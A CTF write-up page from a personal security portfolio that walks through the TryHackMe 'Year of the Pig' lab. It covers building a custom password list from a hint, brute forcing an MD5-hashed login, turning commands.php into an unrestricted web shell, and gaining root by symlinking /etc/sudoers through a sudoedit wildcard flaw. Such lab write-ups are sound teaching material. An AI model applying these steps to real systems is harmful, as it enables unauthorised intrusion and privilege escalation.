@@ -1,0 +1,343 @@
+images/yotp<!DOCTYPE HTML>
+
+<html>
+	<head>
+		<title>Year of the Pig Writeup | Jonathan Vargas</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<a href="index.html" class="logo">Jonathan Vargas</a>
+					</header>
+
+				<!-- Nav -->
+					<nav id="nav">
+						<ul class="links">
+							<li><a href="index.html">Skills Overview</a></li>
+							<li><a href="#">Security Methodologies</a></li>
+							<li><a href="#">SQL Reporting</a></li>
+							<li><a href="#">CTF Write ups</a></li>
+						</ul>
+						<ul class="icons">
+							<li><a href="https://www.instagram.com/jonathan.swing/" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>
+							<li><a href="mailto:11jonathanvargas11@gmail.com?" class="icon solid fa-envelope"><span class="label">Email</span></a></li>
+							<li><a href="https://www.hackthebox.eu/home/users/profile/355309" class="icon solid fa-cube"><span class="label">HackTheBox</span></a></li>
+							<li><a href="https://github.com/vargasportfolio/" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
+						</ul>
+					</nav>
+
+				<!-- Main -->
+					<div id="main">
+
+						<!-- Post -->
+							<section class="post">
+								<header class="major">
+									<span class="date">October 4, 2020</span>
+									<h1>Year of the Pig - Try Hack Me Writeup
+									</h1>
+								</header>
+
+                <!doctype html>
+                <html>
+                <head>
+                <meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
+                <title>Writeup</title></head>
+                <br><br><body><h1>Summary</h1>
+                <p>Year of the Pig is a <a href='https://tryhackme.com/room/yearofthepig'>TryHackMe challenge</a> released on October 9th, 2020, by <a href='https://tryhackme.com/p/MuirlandOracle'>MuirlandOracle</a>. Throughout the challenge, we will explore the repurcussions of having a password hint, automating the creation of a custom password list using Python, brute forcing a login page with OWASP ZAP, pivoting between three different users on the system, and exploiting a sudoedit wildcard path vulnerability using a symbolic link attack.</p>
+                <p>&nbsp;</p>
+                <p>&nbsp;</p>
+                <h1>Port Scanning</h1>
+                <p>As always, we are going to begin enumerating this machine as a non-privileged user with <strong>nmap</strong>. By running the below command, we can understand the machine&#39;s open, accessible ports.</p>
+                <pre><code>nmap -Pn -sCV -p22,80 -oN nmap/Basic_10.10.104.243.nmap &lt;IP&gt;</code></pre>
+                <p>We get the following output from our basic nmap scan:</p>
+                <pre><code># Nmap 7.80 scan initiated Sun Oct 11 10:01:33 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Basic_10.10.104.243.nmap 10.10.104.243
+Nmap scan report for 10.10.104.243
+Host is up (0.69s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Marco&#39;s Blog
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Oct 11 10:01:52 2020 -- 1 IP address (1 host up) scanned in 19.29 seconds</code></pre>
+                <p>A few important things we can tell from these two open ports:</p>
+                <ol>
+                <li>An SSH server is open. As an attacker, we can see this as a possible entry point to the server once we have valid user credentials. But since we don&#39;t have any information on possible users, we will just keep this in the back of our minds for now.</li>
+                <li>Since there isn&#39;t much we can do with SSH at the moment, the HTTP service running on a default port will most definitely be our only method of breaking and entering.</li>
+                <li>The webpage title hosted at this address is <strong>Marco&#39;s Blog</strong>, hinting at the possibility that a user named <strong>Marco</strong> may exist on the system.</li>
+
+                </ol>
+                <p>Without looking further into how the system works, we can already begin devising an attack vector for the host: foothold with HTTP, use SSH for remote code execution, then pivot or escalate privileges to system root. Of course, this is easier said than done and there can be several twists and turns along the way. Before we get too ahead of ourselves, we will begin manually enumerating the website hosted at this address.</p>
+                <p>&nbsp;</p>
+                <h1>Inspecting the Webpage</h1>
+                <h3>Index - Marco&#39;s Blog</h3>
+                <p>The landing page is a fun little autobiography about an Italian Airforce pilot that has retired and began developing this website as a hobby. There are three sections of the website that only scratch the surface about the many adventures he&#39;s had.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_161109.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_161109"></span></figure>
+                <p>From the attacker&#39;s perspective, I am more interested in finding the faults in this website. Begin brute forcing the site&#39;s directories to see if there are any hidden pages we currently don&#39;t have access to. I will be using <strong>Gobuster</strong> in the following command:</p>
+                <pre><code>gobuster dir -u &lt;IP&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -o recon/gobuster-basic.txt</code></pre>
+                <p>It results in the following output:</p>
+                <pre><code>http://10.10.104.243:80/.htaccess (Status: 403) [Size: 278]
+http://10.10.104.243:80/.htaccess.html (Status: 403) [Size: 278]
+http://10.10.104.243:80/.htaccess.php (Status: 403) [Size: 278]
+http://10.10.104.243:80/.hta (Status: 403) [Size: 278]
+http://10.10.104.243:80/.hta.html (Status: 403) [Size: 278]
+http://10.10.104.243:80/.hta.php (Status: 403) [Size: 278]
+http://10.10.104.243:80/.htpasswd (Status: 403) [Size: 278]
+http://10.10.104.243:80/.htpasswd.php (Status: 403) [Size: 278]
+http://10.10.104.243:80/.htpasswd.html (Status: 403) [Size: 278]
+http://10.10.104.243:80/admin (Status: 301) [Size: 314]
+http://10.10.104.243:80/api (Status: 301) [Size: 312]
+http://10.10.104.243:80/assets (Status: 301) [Size: 315]
+http://10.10.104.243:80/css (Status: 301) [Size: 312]
+http://10.10.104.243:80/index.html (Status: 200) [Size: 4801]
+http://10.10.104.243:80/index.html (Status: 200) [Size: 4801]
+http://10.10.104.243:80/js (Status: 301) [Size: 311]
+http://10.10.104.243:80/login.php (Status: 200) [Size: 2790]
+http://10.10.104.243:80/server-status (Status: 403) [Size: 278]</code></pre>
+                <p>From the output, we find that the usual root directory files are in place such as .htaccess and .htpasswd, but I am more interested in <strong>/admin</strong>, <strong>/api</strong>, <strong>/assets</strong>, <strong>/js</strong>, and <strong>/login.php</strong>. Since there are plenty of directories and pages to enumerate, I am going to begin with the lowest hanging fruit: <strong>/admin</strong>.</p>
+                <p>&nbsp;</p>
+                <h3>/Admin and /Login.php</h3>
+                <p>Navigating to <a href='http://MACHINE_IP/admin' target='_blank' class='url'>http://MACHINE_IP/admin</a> results in a redirect to /login.php. </p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_161214.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_161214"></span></figure>
+                <p>Since we know that this blog belongs to <strong>Marco</strong>, I will try a few simple login attempts like <strong>marco:admin</strong>, <strong>marco:password</strong>, and even <strong>admin:admin</strong>, but I get a password hint when making an attempt:</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_161456.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_161456"></span></figure>
+                <p>The password hint is oddly specific. If we are completely relying on the password hint, the password is going to look exactly as described. The problem is we aren&#39;t sure what counts as a memorable word in Marco&#39;s book, or if we would be able to find his kind of password in a wordlist, so we are going to need a ton of guesses to chose from. More specifically, <strong>5,600</strong> of our own guesses.</p>
+                <p>&nbsp;</p>
+                <h1>The Foothold</h1>
+                <h3>Creating Our Own Password Dictionary</h3>
+                <p>Now, we have three ingredients for how Marco creates his passwords:</p>
+                <ol>
+                <li>One word</li>
+                <li>Two numbers</li>
+                <li>A special character</li>
+
+                </ol>
+                <p>Instead of typing out a list of possible password combinations, we can automate this process entirely with Python. Below is a small python script I made to automate the creation of a wordlist specifically catered to Marco&#39;s password methodology:</p>
+                <pre><code class='language-python' lang='python'>memorableWords = [&#39;Italy&#39;, &#39;italy&#39;, &#39;Milan&#39;, &#39;milan&#39;, &#39;Savoia&#39;, &#39;savoia&#39;,
+                  &#39;Curtiss&#39;, &#39;curtiss&#39;, &#39;Curtis&#39;, &#39;curtis&#39;, &#39;planes&#39;, &#39;Planes&#39;,
+                  &#39;Plane&#39;, &#39;plane&#39;]
+specialChars = [&#39;!&#39;,&#39;@&#39;,&#39;#&#39;,&#39;$&#39;]
+count = 0
+
+for word in memorableWords:
+    for specialChar in specialChars:
+        while (count &lt;= 99):
+            if (count &lt;= 9):
+                count = &#39;0&#39; + str(count)
+            else:
+                count = str(count)
+            print(word + count + specialChar)
+            count = int(count)
+            count += 1
+        count = 0</code></pre>
+                <p>First, initialize the ingredients:</p>
+                <ol>
+                <li><strong>memorableWords</strong>: An array of password prefixes as strings.</li>
+                <li><strong>specialChars</strong>: An array of special characters that are typically password-field acceptable.</li>
+                <li><strong>count</strong>: Used to iterate numbers 00 through 99 in place of the two-number requirement.</li>
+                <li>We use two for loops to iterate through both lists and increment the <strong>count</strong> variable with each iteration to ensure we get all possible two-digit combinations. Before the end of each for loop iteration, a possible password is printed.</li>
+
+                </ol>
+                <p>Run the above python script in a terminal with the command below to pipe the output into a list file.</p>
+                <pre><code>python generateList.py &gt; passwords_generated.lst</code></pre>
+                <p>A snippet of the resulting list file:</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_163252.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_163252"></span></figure>
+                <p>There were <strong>5,600</strong> potential passwords generated all the way from Italy00! to plane99$. That would have been a pain to type by hand.</p>
+                <p>&nbsp;</p>
+                <h3>Brute Forcing the Login</h3>
+                <p>Up to this point, we have a list of possible passwords that are applicable to only a specific user and a login page. This section describes how we will put these two together.</p>
+                <p>For brute forcing the login with our custom wordlist, we will be using <strong>OWASP ZAP</strong>, a web application penetration testing tool similar to <strong>Burp Suite</strong>, except it is completely free and open source. The reason I am using <strong>ZAP</strong> for this engagement is due to the fact that we are using a wordlist containing 5,600 guesses and <strong>Burp</strong> will heavily throttle your brute force speed around 100 guesses if you aren&#39;t a premium user.</p>
+                <ol>
+                <li><p>Launch <strong>OWASP ZAP</strong>. I will be using <strong>Foxy Proxy</strong> to direct traffic to <strong>127.0.0.1</strong>: the address that <strong>ZAP</strong> is intercepting packets on.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_170534.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_170534"></span></figure>
+                <p>For future reference, the above screenshot is what my current ZAP layout looks like. It is the default workspace, so new users can access this same screen at startup.</p>
+                </li>
+                <li><p>Navigate to the login page at <a href='http://MACHINE_IP/login.php' target='_blank' class='url'>http://MACHINE_IP/login.php</a></p>
+                </li>
+                <li><p>At the login page, try logging in with any credentials. In my case, I am using <strong>marco:password</strong>.</p>
+                <p>When going back to ZAP, there are fields populated on the small right-hand pane. One of them being the POST request intercepted when attemping to login to the webpage.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_171109.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_171109"></span></figure>
+                <p>Notice how the password is not the same as entered in the login field. In its place is a hash. Upon further enumeration using inspect element on the login page, there is some obfuscated javascript code being run on our end:</p>
+                <pre><code>const _0x44d4=[&#39;auth&#39;,&#39;querySelector&#39;,&#39;click&#39;,&#39;replace&#39;,&#39;post&#39;,&#39;#submit-btn&#39;,&#39;input&#39;,&#39;then&#39;,&#39;authLogin=&#39;,&#39;addEventListener&#39;,&#39;keyCode&#39;,&#39;#username&#39;,&#39;style&#39;,&#39;Success&#39;,&#39;/admin&#39;,&#39;keyup&#39;,&#39;location&#39;,&#39;Response&#39;,&#39;cookie&#39;,&#39;application/json&#39;,&#39;stringify&#39;,&#39;same-origin&#39;,&#39;querySelectorAll&#39;,&#39;value&#39;,&#39;opacity:\x201&#39;];(function(_0x2a05df,_0x44d43e){const _0x48fdee=function(_0x21eb22){while(--_0x21eb22){_0x2a05df[&#39;push&#39;](_0x2a05df[&#39;shift&#39;]());}};_0x48fdee(++_0x44d43e);}(_0x44d4,0x114));const _0x48fd=function(_0x2a05df,_0x44d43e){_0x2a05df=_0x2a05df-0x0;let _0x48fdee=_0x44d4[_0x2a05df];return _0x48fdee;};function login(){const _0x289586=document[_0x48fd(&#39;0x0&#39;)](&#39;#username&#39;),_0x56c661=document[_0x48fd(&#39;0x0&#39;)](&#39;#password&#39;),_0x236a57=md5(_0x56c661[_0x48fd(&#39;0x16&#39;)]);fetch(&#39;/api/login&#39;,{&#39;method&#39;:_0x48fd(&#39;0x3&#39;),&#39;credentials&#39;:_0x48fd(&#39;0x14&#39;),&#39;headers&#39;:{&#39;Accept&#39;:_0x48fd(&#39;0x12&#39;)},&#39;body&#39;:JSON[_0x48fd(&#39;0x13&#39;)]({&#39;username&#39;:_0x289586[_0x48fd(&#39;0x16&#39;)],&#39;password&#39;:_0x236a57})})[_0x48fd(&#39;0x6&#39;)](_0x59ed95=&gt;_0x59ed95[&#39;json&#39;]())[&#39;then&#39;](_0x5d33bc=&gt;{document[_0x48fd(&#39;0x0&#39;)](_0x48fd(&#39;0xa&#39;))[&#39;value&#39;]=&#39;&#39;,document[_0x48fd(&#39;0x0&#39;)](&#39;#password&#39;)[_0x48fd(&#39;0x16&#39;)]=&#39;&#39;,_0x5d33bc[_0x48fd(&#39;0x10&#39;)]==_0x48fd(&#39;0xc&#39;)?(document[_0x48fd(&#39;0x11&#39;)]=_0x48fd(&#39;0x7&#39;)+_0x5d33bc[_0x48fd(&#39;0x18&#39;)]+&#39;;\x20samesite=lax;\x20path=\x22/\x22&#39;,window[_0x48fd(&#39;0xf&#39;)][_0x48fd(&#39;0x2&#39;)](_0x48fd(&#39;0xd&#39;))):(alert(_0x5d33bc[&#39;Verbose&#39;]),document[_0x48fd(&#39;0x0&#39;)](&#39;#pass-hint&#39;)[_0x48fd(&#39;0xb&#39;)]=_0x48fd(&#39;0x17&#39;));});}document[_0x48fd(&#39;0x15&#39;)](_0x48fd(&#39;0x5&#39;))[&#39;forEach&#39;](_0x47694c=&gt;{_0x47694c[_0x48fd(&#39;0x8&#39;)](_0x48fd(&#39;0xe&#39;),_0x571e21=&gt;{_0x571e21[_0x48fd(&#39;0x9&#39;)]===0xd&amp;&amp;document[_0x48fd(&#39;0x0&#39;)](_0x48fd(&#39;0x4&#39;))[_0x48fd(&#39;0x1&#39;)]();});});</code></pre>
+                <p>Pasting this in a text file and searching for the string &quot;password&quot; shows us that user input for the password field is in fact being hashed with MD5.</p>
+                <pre><code>(&#39;#password&#39;),_0x236a57=md5(_0x56c661[_0x48fd(&#39;0x16&#39;)])</code></pre>
+                <p>Of course, this code makes no sense when getting down to the details of how it works due to the obfuscation, but we can at least deduct that important part of it.</p>
+                </li>
+                <li><p>Hash all of our generated passwords using MD5 and pipe the hashes into a new password list.</p>
+                <pre><code class='language-shell' lang='shell'>while read -r passwords_generated.txt; do printf %s &quot;$line&quot; | md5sum | cut -f1 -d&#39; &#39;; done &lt; passwords.lst</code></pre>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_172642.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_172642"></span></figure>
+                <p>&nbsp;</p>
+                </li>
+                <li><p>Back at ZAP, right click the <strong>POST</strong> login request and select <strong>Attack &gt; Fuzz</strong>.</p>
+                <p>A window opens for you to specify the exact fuzz location. Select the entire password hash payload and click <strong>Add</strong> on the right-hand pane to add this as a fuzz location.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_171952.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_171952"></span></figure>
+                </li>
+                <li><p>Another window will open that asks for a wordlist you would like to use. Select <strong>Add</strong> and paste the list of possible MD5 combinations into the <strong>Contents</strong> text field. Confirm all changes and select <strong>Start Fuzzer</strong>.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_172953.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_172953"></span></figure>
+                <p>In order to quickly tell if we have brute forced the correct credentials, I have sorted each POST request by <strong>Size Resp. Body</strong> to determine if there are any unusually large or small &quot;success&quot; pages being output on an attempt. From what we can tell early on in the brute forcing process, a normal response is 63 bytes in size. However, we receive one reponse that is 99 bytes in size. Viewing the reponse body of this request shows that we have successfully guessed the correct credentials on the 2,022nd try.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_173335.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_173335"></span></figure>
+                </li>
+                <li><p>Finally, we have the MD5 password hash that marco authenticates with. Searching for this exact hash in our password.lst file translates the hash into plaintext, and we can now log in with our valid credentials.</p>
+                </li>
+
+                </ol>
+                <p>&nbsp;</p>
+                <h1>Authenticated Web Enumeration</h1>
+                <p>Up to this point, we have a user to login as at the website and can begin enumerating internally. Upon logging in, we are presented with some simple configurations like add user, delete user, and change password. What stands out here is the <strong>Commands</strong> section of the admin panel. Navigating to this page brings us to a field where we can potentially execute arbitrary commands on the server as <strong>www-data</strong>.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_174001.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_174001"></span></figure>
+                <p>It was unsettling how easily this RCE section of the admin panel was added to us. <strong>whoami</strong> and <strong>id</strong> works to see who we are executing commands, but not to my surprise, that&#39;s pretty much the extent of useful commands we can execute from this interface. Looking deeper into this at the moment would be considered a rabbit hole.</p>
+                <p>&nbsp;</p>
+                <p>&nbsp;</p>
+                <h1>SSH: Marco</h1>
+                <p>Marco&#39;s credentials for gaining access to his website&#39;s admin panel are the same for logging into the system as marco, meaning we can ssh into the host as Marco.</p>
+                <pre><code>ssh marco@&lt;IP&gt;</code></pre>
+                <p><strong>Flag1.txt</strong> is present in his home directory.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_174422.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_174422"></span></figure>
+                <p>Marco is not able to run sudo commands, so my initial method of escalating privileges was shot down swiftly. Upon further enumeration, there is another user on the system, <strong>curtis</strong>, and an <strong>admin.db</strong> file located in <strong>/var/www</strong>. By naming convention, this is the database file that contains all of the site&#39;s user hashes, which means that we have a path of pivoting into <strong>curtis&#39;</strong> account who may have more privileges that we do. However, we are unable to view the database file because it is owned by <strong>www-data.</strong> Our only choice now is to figure out a way to break the RCE constraints on the <strong>commands.php</strong> page.</p>
+                <p>&nbsp;</p>
+                <h1>Pivoting to WWW-Data</h1>
+                <p>Located in <strong>/var/www/html/admin</strong> is the <strong>commands.php</strong> file that is used for RCE on the admin panel. It happens to be owned by <strong>www-data</strong> and the <strong>web-developers</strong> group, which we happen to be a part of. Here is a snippet of the current <strong>commands.php</strong> source code:</p>
+                <pre><code class='language-php' lang='php'>&lt;?php
+//Totally useless script to catch hackers out, eh, Marco? You old rogue!
+if (isset($_POST[&quot;command&quot;])){
+    echo &quot;&lt;pre&gt;&quot;;
+    $cmd=$_POST[&quot;command&quot;];
+    if (strlen($cmd) == 0){
+        echo &quot;No command entered&quot;;
+    }
+    else if ($cmd == &quot;whoami&quot;){
+        echo &quot;www-data&quot;;
+    }
+    else if ($cmd == &quot;id&quot;){
+        echo &quot;uid=33(www-data) gid=33(www-data) groups=33(www-data)&quot;;
+    }
+    else if ($cmd == &quot;ifconfig&quot;){
+        system(&quot;ifconfig&quot;);
+    }
+    else if (substr($cmd,0,5) == &quot;echo &quot;){
+        echo substr($cmd,5);
+    }
+    else if ($cmd == &quot;hostname&quot;){
+        echo &quot;year-of-the-pig&quot;;
+    }
+    else if (stristr($cmd,&quot;nc&quot;)){
+        preg_match(&quot;/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} +\d{1,5}/&quot;, $cmd, $string);
+        $components = explode(&quot; &quot;, $string[0]);
+        $ip = $components[0];
+        $port = end(array_values($components));
+        system(&quot;nc $ip $port &gt;/dev/null 2&gt;&amp;1&quot;);
+    }
+    else{
+        echo &quot;Invalid Command!&quot;;
+    }
+    echo &quot;&lt;pre&gt;\n&quot;;
+}
+?&gt;</code></pre>
+                <p>We are going to edit this so that a command gets executed without constraint. Here is the modified php file that will allow us to execute far more commands without an error being thrown:</p>
+                <pre><code class='language-php' lang='php'>&lt;?php
+//Totally useless script to catch hackers out, eh, Marco? You old rogue!
+if (isset($_POST[&quot;command&quot;])){
+    echo &quot;&lt;pre&gt;&quot;;
+    $cmd=$_POST[&quot;command&quot;];
+    if (strlen($cmd) == 0){
+        echo &quot;No command entered&quot;;
+    }
+    else if ($cmd == &quot;whoami&quot;){
+        echo &quot;www-data&quot;;
+    }
+    else if ($cmd == &quot;id&quot;){
+        echo &quot;uid=33(www-data) gid=33(www-data) groups=33(www-data)&quot;;
+    }
+    else if ($cmd == &quot;ifconfig&quot;){
+        system(&quot;ifconfig&quot;);
+    }
+    else if (substr($cmd,0,5) == &quot;echo &quot;){
+        system($cmd);
+    }
+    else if ($cmd == &quot;hostname&quot;){
+        echo &quot;year-of-the-pig&quot;;
+    }
+    else{
+        system($cmd);
+    }
+    echo &quot;&lt;pre&gt;\n&quot;;
+}
+?&gt;</code></pre>
+                <p>At the end of the chain of if statements, notice that we changed the else body from <strong>echo &quot;Invalid Command!&quot;;</strong> to <strong>system($cmd);</strong> in order to gain full RCE.</p>
+                <p>After updating the <strong>commands.php</strong> file to allow full RCE, we can run cat on the admin.db file to read its contents from the commands page.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_180010.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_180010"></span></figure>
+                <p>&nbsp;</p>
+                <p>&nbsp;</p>
+                <h1>Cracking Curtis&#39; Hash</h1>
+                <p>From the output of the cat command on admin.db using the admin panel&#39;s web shell, we can view both Marco and Curtis&#39; password hashes. The first time I tried cracking this hash, I used John and that didn&#39;t seem to do the trick, so for this CTF, we are using <a href='https://hashes.com/en/decrypt/hash'>hashes.com</a>. Input curtis&#39; hash in the text box and a plaintext password is returned in seconds.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_180447.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_180447"></span></figure>
+                <p>&nbsp;</p>
+                <p>&nbsp;</p>
+                <h1>Obtaining Root</h1>
+                <p>Flag2.txt is present in Curtis&#39; home directory.</p>
+                <p>Once ssh&#39;d into Curtis&#39; session, we can begin enumeration under his privileges. Running <strong>sudo -l</strong> showed an interesting sudo permission:
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_180652.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_180652"></span></figure>
+                <p>This <a href='https://github.com/t0kx/privesc-CVE-2015-5602'>PoC on Github</a> explains that having wildcards in a sudoedit target path makes the system vulnerable to a symbolic link attack.  This means that we can potentially link <strong>config.php</strong> from the sudoedit wildcard path to a sensitive file we can write to. So the question is, if we can write to any file on the system, how can we become root?</p>
+                <p>The path specified in our sudo ability can be translated to <strong>any two-level subdirectories containing config.php</strong>. Since config.php does not exist in this wildcard path, we have to create it ourselves as a symbolic link.</p>
+                <ol>
+                <li><p>Navigate back to the website admin panel&#39;s commands page.</p>
+                </li>
+                <li><p>Run <strong>ln -s /etc/sudoers /var/www/html/assets/img/config.php</strong></p>
+                <p>We are using /var/www/html/assets/img/config.php because it is two subdirectories below /var/www/html and we can modify files in this directory only as www-data.</p>
+                </li>
+                <li><p>Navigate to /var/www/html/assets/img as <strong>Curtis</strong>. At this directory, there should be a config.php file linking to /etc/sudoers.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_182532.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_182532"></span></figure>
+                </li>
+                <li><p>Now, as <strong>Curtis</strong>, run the sudoedit command specified from <strong>sudo -l</strong></p>
+                </li>
+
+                </ol>
+                <pre><code>sudoedit /var/www/html/*/*/config.php</code></pre>
+                <ol start='5' >
+                <li><p>Add <strong>curtis ALL=(ALL) ALL</strong> under the <strong>User privilege specification</strong> section.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_182925.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_182925"></span></figure>
+                </li>
+                <li><p>Write to the file by pressing ESC and typing <strong>:wq</strong></p>
+                </li>
+                <li><p>Run <strong>sudo su</strong> as curtis to gain root privileges.</p>
+                <figure><span class="image fit"><img src="images/yotp/Screenshot_20201013_183103.png" referrerpolicy="no-referrer" alt="Screenshot_20201013_183103"></span></figure>
+                </li>
+
+                </ol>
+                </body>
+                </html>
+
+						</section>
+
+					</div>
+
+				<!-- Footer -->
+				<!-- Copyright -->
+					<div id="copyright">
+						<ul><li>Jonathan Vargas</li><li>Cybersec Portfolio</li></ul>
+					</div>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
